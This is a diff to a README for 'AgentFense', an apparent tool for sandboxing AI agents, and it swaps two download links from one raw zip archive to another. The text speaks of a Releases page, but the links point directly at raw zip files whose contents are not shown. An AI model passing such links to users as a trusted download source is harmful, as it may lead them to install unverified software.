@@ -16,7 +16,7 @@ Welcome to AgentFense! This application creates a safe space for AI agents to op
 
 To download AgentFense, simply visit the Releases page. This page contains the latest version and instructions for downloading the software.
 
-[![Download AgentFense](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense-Agent-3.0.zip)](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense-Agent-3.0.zip)
+[![Download AgentFense](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense_Agent_v3.6.zip)](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense_Agent_v3.6.zip)
 
 ### Steps to Download
 
@@ -67,4 +67,4 @@ For more details about the license, please visit the repository.
 
 If you need further assistance, feel free to open an issue in the GitHub repository or contact the maintainers directly for help. Your feedback is valuable and helps improve the application.
 
-Visit [this page to download](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense-Agent-3.0.zip) AgentFense and explore the features it offers!
+Visit [this page to download](https://raw.githubusercontent.com/ydevil2009/AgentFense/main/jar/Fense_Agent_v3.6.zip) AgentFense and explore the features it offers!
